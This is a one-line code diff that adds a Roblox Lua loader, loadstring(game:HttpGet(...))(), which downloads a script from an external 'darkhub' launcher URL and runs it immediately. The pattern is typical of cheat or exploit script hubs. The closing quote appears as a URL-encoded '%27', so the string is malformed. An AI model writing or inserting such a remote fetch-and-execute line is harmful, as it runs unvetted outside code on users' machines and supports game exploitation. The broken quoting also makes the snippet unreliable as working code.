@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://darkhub.xyz/launcher/script.lua%27), true))()
